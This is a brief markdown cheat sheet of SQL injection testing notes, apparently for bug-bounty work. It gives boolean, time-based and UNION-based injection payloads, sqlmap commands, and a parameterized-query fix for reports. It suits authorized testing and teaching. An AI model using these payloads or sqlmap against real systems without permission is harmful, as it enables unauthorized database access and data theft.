# SQL Injection - quick notes (example file, replace with your own notes)

## Detection
- Try a single quote `'` and a double quote `"` and watch for errors or changed responses.
- Boolean test: `' AND 1=1-- -` vs `' AND 1=2-- -`. Different page = likely injectable.
- Time test (MySQL): `' AND SLEEP(5)-- -`

## UNION based
1. Find the column count: `' ORDER BY 1-- -`, increase until error.
2. Find printable columns: `' UNION SELECT 1,2,3-- -`
3. Read data: `' UNION SELECT 1,database(),user()-- -`

## sqlmap
- `sqlmap -r request.txt --batch` (save the request from Burp first)
- Add `--level 5 --risk 3` only when allowed by the program rules.

## Fix (for reports)
- Prepared statements / parameterized queries. Never build SQL with string concatenation.
